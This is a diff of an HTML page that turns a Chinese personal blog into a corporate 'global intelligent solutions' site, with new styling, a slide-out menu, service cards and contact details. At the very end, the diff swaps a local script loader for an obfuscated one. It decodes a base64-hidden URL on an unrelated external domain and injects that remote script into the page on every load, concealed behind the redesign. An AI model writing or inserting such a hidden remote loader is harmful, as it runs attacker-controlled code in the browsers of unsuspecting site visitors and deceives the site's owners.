@@ -5,15 +5,17 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>思维流：数字画布</title>
+    <title>寰宇智联 - 全球智能解决方案</title>
     <style>
         body {
             overflow: hidden;
             font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #1E2A38;
-            color: #E0E6ED;
+            background-color: #F8F8F8;
+            /* 极浅灰色背景 */
+            color: #333333;
+            /* 标准深灰色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -26,267 +28,296 @@
             padding: 30px 0;
         }
 
+        /* 头部 - 简洁与质感 */
         header {
-            background-color: #1E2A38;
-            padding: 60px 20px;
+            background-color: #0A2E36;
+            /* 深青蓝色头部背景 */
+            color: #FFFFFF;
+            padding: 25px 20px;
             text-align: center;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            border-bottom: 5px solid #FF6F61;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
         header::before {
+            /* 顶部背景抽象图案 */
             content: '';
             position: absolute;
-            top: -50px;
-            left: -50px;
-            width: 250px;
-            height: 250px;
-            background: #F0E68C;
-            border-radius: 60% 40% 30% 70% / 60% 30% 70% 40%;
-            transform: rotate(30deg);
-            opacity: 0.15;
-            z-index: 0;
-        }
-
-        header::after {
-            content: '';
-            position: absolute;
-            bottom: -70px;
-            right: -70px;
-            width: 350px;
-            height: 350px;
-            background: #FF6F61;
-            border-radius: 40% 60% 60% 40% / 40% 40% 60% 60%;
-            transform: rotate(-50deg);
-            opacity: 0.1;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(255, 193, 7, 0.05) 25%, transparent 25%, transparent 75%, rgba(255, 193, 7, 0.05) 75%, rgba(255, 193, 7, 0.05) 100%),
+                linear-gradient(-45deg, rgba(255, 193, 7, 0.05) 25%, transparent 25%, transparent 75%, rgba(255, 193, 7, 0.05) 75%, rgba(255, 193, 7, 0.05) 100%);
+            background-size: 40px 40px;
             z-index: 0;
         }
 
         header h1 {
             margin: 0;
             font-family: 'Montserrat', sans-serif;
-            font-size: 3.5em;
-            color: #FF6F61;
-            letter-spacing: 4px;
+            font-size: 2.2em;
+            color: #FFC107;
+            /* 强调色：金色 */
+            letter-spacing: 1px;
             text-transform: uppercase;
-            text-shadow: 0 0 20px rgba(255, 111, 97, 0.6);
+            text-shadow: 0 0 10px rgba(255, 193, 7, 0.5);
             position: relative;
             z-index: 1;
+            flex-grow: 1;
         }
 
-        #tagline {
-            font-family: 'Playfair Display', serif;
-            font-size: 1.4em;
-            color: #F0E68C;
-            margin-top: 15px;
-            position: relative;
-            z-index: 1;
-            min-height: 1.4em;
-            display: inline-block;
+        header p {
+            display: none;
         }
 
+        /* 菜单切换按钮 - 绝对定位在右上角 */
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 2em;
+            color: #FFC107;
+            /* 强调色 */
+            cursor: pointer;
+            padding: 5px;
+            position: absolute;
+            /* 绝对定位 */
+            top: 25px;
+            /* 距离顶部 */
+            right: 20px;
+            /* 距离右侧 */
+            z-index: 2;
+            transition: transform 0.3s ease;
+        }
+
+        .menu-toggle:hover {
+            transform: scale(1.1);
+            text-shadow: 0 0 8px rgba(255, 193, 7, 0.6);
+        }
+
+        /* 侧边导航菜单 */
         nav {
-            background-color: #2C3E50;
-            padding: 15px 0;
-            margin-top: 40px;
-            border-radius: 10px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
-            position: sticky;
-            top: 20px;
-            z-index: 1000;
-            width: 90%;
-            /* Adjusted width for better mobile fit */
-            max-width: 700px;
-            margin-left: auto;
-            margin-right: auto;
-            /* Removed display: flex from nav itself */
+            position: fixed;
+            top: 0;
+            right: -280px;
+            width: 250px;
+            height: 100%;
+            background-color: #FFFFFF;
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
+            transition: right 0.4s ease-in-out;
+            z-index: 1001;
+            padding-top: 80px;
+            box-sizing: border-box;
+        }
+
+        nav.is-open {
+            right: 0;
         }
 
         nav ul {
             list-style: none;
-            padding: 0 10px;
-            /* Added horizontal padding */
+            padding: 0;
             margin: 0;
             display: flex;
-            justify-content: center;
-            /* Centered items when wrapped */
-            flex-wrap: wrap;
-            /* Allow items to wrap */
+            flex-direction: column;
             gap: 10px;
-            /* Consistent spacing between items */
-        }
-
-        nav ul li {
-            /* Margin handled by gap now */
         }
 
         nav ul li a {
-            background-color: transparent;
-            color: #E0E6ED;
+            color: #333333;
             text-decoration: none;
-            padding: 10px 20px;
-            /* Slightly adjusted padding for better fit */
-            border-radius: 8px;
-            border: 2px solid #AAB8C2;
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease, border-color 0.3s ease;
-            display: inline-block;
-            font-weight: bold;
-            font-size: 1em;
-            text-transform: uppercase;
+            padding: 15px 20px;
+            border-bottom: 1px solid #E0E0E0;
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            font-size: 1.1em;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #FF6F61;
-            color: #1E2A38;
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.4);
-            border-color: #FF6F61;
+            background-color: #F8F8F8;
+            color: #FFC107;
+            /* 强调色文字 */
+            transform: translateX(5px);
+        }
+
+        nav ul li:last-child a {
+            border-bottom: none;
+        }
+
+        nav ul li a .icon {
+            font-size: 1.5em;
+            margin-right: 15px;
+            color: #0A2E36;
+            /* 图标主色 */
+        }
+
+        /* 菜单打开时的背景遮罩 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
+        }
+
+        .overlay.is-visible {
+            opacity: 1;
+            visibility: visible;
         }
 
         main {
-            padding-top: 40px;
+            padding-top: 30px;
         }
 
-        .article-card {
-            background-color: #2C3E50;
-            margin-bottom: 50px;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        /* 内容区 - 结构化卡片 */
+        section {
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
+            border-radius: 10px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
             position: relative;
             overflow: hidden;
-            border-left: 8px solid #F0E68C;
+            border: 1px solid #E0E0E0;
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .article-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
-        }
-
-        .article-card::before {
+        section::before {
+            /* 顶部强调色条 */
             content: '';
             position: absolute;
-            top: -20px;
-            right: -20px;
-            width: 100px;
-            height: 100px;
-            background: #FF6F61;
-            border-radius: 30% 70% 50% 50% / 50% 50% 70% 30%;
-            opacity: 0.08;
-            transform: rotate(15deg);
-            z-index: 0;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background-color: #FFC107;
+            /* 强调色 */
+            box-shadow: 0 0 10px rgba(255, 193, 7, 0.5);
         }
 
-        .article-card h2 {
+        section h2 {
             font-family: 'Montserrat', sans-serif;
-            font-size: 2.5em;
-            color: #FF6F61;
+            font-size: 2.2em;
+            color: #0A2E36;
+            /* 主色 */
             margin-top: 0;
             margin-bottom: 20px;
-            border-bottom: 1px dashed #AAB8C2;
+            border-bottom: 1px solid #E0E0E0;
             padding-bottom: 10px;
-            position: relative;
-            z-index: 1;
         }
 
-        .article-card .date {
-            font-size: 1em;
-            color: #AAB8C2;
-            margin-bottom: 25px;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            position: relative;
-            z-index: 1;
+        section h3 {
+            font-size: 1.5em;
+            color: #FFC107;
+            /* 强调色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
         }
 
-        .article-card p {
-            font-size: 1.1em;
-            color: #E0E6ED;
-            margin-bottom: 30px;
-            position: relative;
-            z-index: 1;
+        section p {
+            font-size: 1.05em;
+            color: #555555;
+            margin-bottom: 20px;
         }
 
-        .article-card img {
+        section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 30px auto;
+            margin: 25px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid #E0E0E0;
+        }
+
+        .service-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+
+        .service-item {
+            background-color: #F5F5F5;
+            /* 服务项背景 */
+            padding: 25px;
             border-radius: 10px;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
-            border: 3px solid #F0E68C;
-            position: relative;
-            z-index: 1;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid #E0E0E0;
         }
 
-        .read-more {
-            display: inline-block;
-            background-color: #FF6F61;
-            color: #FFFFFF;
-            padding: 15px 35px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.1em;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 5px 15px rgba(255, 111, 97, 0.3);
-            border: none;
-            position: relative;
-            z-index: 1;
-        }
-
-        .read-more:hover {
-            background-color: #E65C5C;
+        .service-item:hover {
             transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.5);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
+        }
+
+        .service-item h3 {
+            margin-top: 0;
+            margin-bottom: 10px;
+            color: #0A2E36;
+            /* 主色 */
+        }
+
+        .service-item p {
+            font-size: 0.95em;
+            color: #555555;
+        }
+
+        .contact-info p {
+            margin-bottom: 12px;
+            font-size: 1.1em;
+            color: #555555;
+        }
+
+        .contact-info a {
+            color: #0A2E36;
+            /* 主色 */
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .contact-info a:hover {
+            color: #FFC107;
+            /* 强调色 */
         }
 
         footer {
-            background-color: #1E2A38;
-            color: #AAB8C2;
-            padding: 50px 0;
+            background-color: #0A2E36;
+            /* 深青蓝色页脚背景 */
+            color: #FFFFFF;
+            padding: 40px 0;
             text-align: center;
             font-size: 0.95em;
             margin-top: 60px;
-            border-top: 5px solid #F0E68C;
-            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
         }
 
-        footer::before {
-            content: '';
-            position: absolute;
-            bottom: -50px;
-            left: -50px;
-            width: 200px;
-            height: 200px;
-            background: #FF6F61;
-            border-radius: 70% 30% 60% 40% / 30% 70% 40% 60%;
-            transform: rotate(40deg);
-            opacity: 0.08;
-            z-index: 0;
-        }
-
-        .social-links a {
-            color: #E0E6ED;
+        .footer-links a {
+            color: #FFFFFF;
             text-decoration: none;
             margin: 0 20px;
-            font-size: 1.8em;
+            font-size: 1.5em;
             transition: color 0.3s ease, transform 0.2s ease;
-            position: relative;
-            z-index: 1;
         }
 
-        .social-links a:hover {
-            color: #F0E68C;
+        .footer-links a:hover {
+            color: #FFC107;
+            /* 强调色 */
             transform: translateY(-5px) scale(1.1);
         }
     </style>
@@ -296,51 +327,72 @@
 <body>
     <header>
         <div class="container">
-            <h1>思维流</h1>
-            <p id="tagline"></p>
+            <h1>寰宇智联</h1>
+            <button class="menu-toggle" id="menuToggle">&#9776;</button>
         </div>
     </header>
 
+    <nav id="mainNav">
+        <ul>
+            <li><a href="#about-us"><span class="icon">&#127760;</span> 关于我们</a></li>
+            <li><a href="#our-solutions"><span class="icon">&#128187;</span> 我们的方案</a></li>
+            <li><a href="#global-reach"><span class="icon">&#127757;</span> 全球布局</a></li>
+            <li><a href="#contact-us"><span class="icon">&#128222;</span> 联系我们</a></li>
+        </ul>
+    </nav>
+
+    <div class="overlay" id="menuOverlay"></div>
+
     <div class="container">
-        <nav id="mainNav">
-            <ul>
-                <li><a href="#latest-thoughts">最新思想</a></li>
-                <li><a href="#creative-works">创意作品</a></li>
-                <li><a href="#about-me">关于我</a></li>
-                <li><a href="#contact">联系</a></li>
-            </ul>
-        </nav>
-
         <main>
-            <section id="latest-thoughts">
-                <h2>最新思想</h2>
-                <div class="article-list">
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=1&seed=abstract-thought-01" alt="抽象思考"
-                            class="random-image">
-                        <h2>意识的边界：探索数字与现实的交织</h2>
-                        <span class="date">2025年07月29日</span>
-                        <p>在数字信息无处不在的今天，我们如何定义“现实”？本文将探讨意识、技术与感官体验之间的复杂关系。</p>
-                        <a href="#" class="read-more">深入思考</a>
-                    </div>
+            <section id="about-us">
+                <h2>关于我们：连接世界，智创未来</h2>
+                <img src="https://picsum.photos/300/200?random=1&seed=global-network-01" alt="全球网络图"
+                    class="random-image">
+                <p>寰宇智联致力于提供全球领先的智能解决方案，连接企业与未来。我们深耕人工智能、大数据和云计算领域，为客户提供创新、高效、安全的数字化转型服务。</p>
+                <p>我们相信，通过技术的力量，能够让世界更加智能，让连接无处不在。</p>
+            </section>
 
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=2&seed=geometric-patterns-02" alt="几何图案"
-                            class="random-image">
-                        <h2>几何之美：代码中的秩序与混沌</h2>
-                        <span class="date">2025年07月25日</span>
-                        <p>代码是逻辑的艺术，而几何图形则是其视觉表达。本文将展示如何在编程中创造出令人惊叹的几何美学。</p>
-                        <a href="#" class="read-more">探索几何</a>
+            <section id="our-solutions">
+                <h2>我们的方案：驱动业务增长</h2>
+                <p>我们提供多元化的智能解决方案，助力您的业务实现飞跃：</p>
+                <div class="service-grid">
+                    <div class="service-item">
+                        <h3>AI驱动型平台</h3>
+                        <p>构建智能决策系统和自动化流程，提升运营效率。</p>
                     </div>
+                    <div class="service-item">
+                        <h3>大数据分析服务</h3>
+                        <p>从海量数据中挖掘深层洞察，支持精准商业决策。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>云原生部署与优化</h3>
+                        <p>提供弹性、高可用的云基础设施和DevOps实践。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>智能物联网(AIoT)</h3>
+                        <p>集成AI与IoT技术，实现设备智能互联与远程管理。</p>
+                    </div>
+                </div>
+                <img src="https://picsum.photos/300/200?random=2&seed=solutions-showcase-02" alt="解决方案展示"
+                    class="random-image">
+            </section>
 
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=3&seed=fluid-motion-03" alt="流体运动"
-                            class="random-image">
-                        <h2>流体设计：用户体验的无缝流动</h2>
-                        <span class="date">2025年07月18日</span>
-                        <p>一个优秀的用户界面，其设计应像流体般自然。本文将解析如何通过动画和交互，实现无缝的用户体验。</p>
-                        <a href="#" class="read-more">体验流动</a>
-                    </div>
+            <section id="global-reach">
+                <h2>全球布局：服务无界</h2>
+                <img src="https://picsum.photos/300/200?random=3&seed=world-map-03" alt="世界地图" class="random-image">
+                <p>寰宇智联在全球多个主要城市设有分支机构和合作伙伴，确保能够为不同地区的客户提供及时、专业的本地化服务。</p>
+                <p>我们的全球网络使我们能够更好地理解并响应各地市场的独特需求。</p>
+            </section>
+
+            <section id="contact-us">
+                <h2>联系我们：开启智能合作</h2>
+                <p>我们期待与您建立联系，共同探索智能世界的无限可能。</p>
+                <div class="contact-info">
+                    <p><strong>总部地址：</strong> 寰宇智联大厦A座1808室</p>
+                    <p><strong>联系电话：</strong> <a href="tel:+861099998888">+86 10 9999 8888</a></p>
+                    <p><strong>电子邮箱：</strong> <a href="mailto:info@globalintel.com">info@globalintel.com</a></p>
+                    <p><strong>服务时间：</strong> 周一至周五 9:00 - 18:00 (GMT+8)</p>
                 </div>
             </section>
         </main>
@@ -348,11 +400,11 @@
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 思维流. 数字版权所有.</p>
-            <div class="social-links">
-                <a href="#" target="_blank">🔗</a> |
-                <a href="#" target="_blank">✨</a> |
-                <a href="#" target="_blank">💡</a>
+            <p>&copy; 2025 寰宇智联. 版权所有.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">隐私政策</a> |
+                <a href="#" target="_blank">服务条款</a> |
+                <a href="#" target="_blank">职业发展</a>
             </div>
         </div>
     </footer>
@@ -368,7 +420,19 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            document.querySelectorAll('nav a').forEach(anchor => {
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+            const menuOverlay = document.getElementById('menuOverlay');
+
+            function toggleMenu() {
+                mainNav.classList.toggle('is-open');
+                menuOverlay.classList.toggle('is-visible');
+            }
+
+            menuToggle.addEventListener('click', toggleMenu);
+            menuOverlay.addEventListener('click', toggleMenu);
+
+            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
                     e.preventDefault();
 
@@ -377,64 +441,29 @@
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20,
+                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
                             behavior: 'smooth'
                         });
+                        toggleMenu();
                     }
                 });
             });
-
-            const taglineElement = document.getElementById('tagline');
-            const taglines = [
-                "捕捉灵感瞬间",
-                "探索未知领域",
-                "构建数字世界",
-                "分享独特视角"
-            ];
-            let taglineIndex = 0;
-            let charIndex = 0;
-            let isDeleting = false;
-            let typingSpeed = 100;
-            let deletingSpeed = 50;
-            let delayBetweenTaglines = 1500;
-
-            function typeWriter() {
-                const currentTagline = taglines[taglineIndex];
-                if (isDeleting) {
-                    taglineElement.textContent = currentTagline.substring(0, charIndex--);
-                } else {
-                    taglineElement.textContent = currentTagline.substring(0, charIndex++);
-                }
-
-                let speed = isDeleting ? deletingSpeed : typingSpeed;
-
-                if (!isDeleting && charIndex === currentTagline.length + 1) {
-                    speed = delayBetweenTaglines;
-                    isDeleting = true;
-                } else if (isDeleting && charIndex === -1) {
-                    isDeleting = false;
-                    taglineIndex = (taglineIndex + 1) % taglines.length;
-                    speed = typingSpeed;
-                }
-
-                setTimeout(typeWriter, speed);
-            }
-
-            typeWriter();
         });
     </script>
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
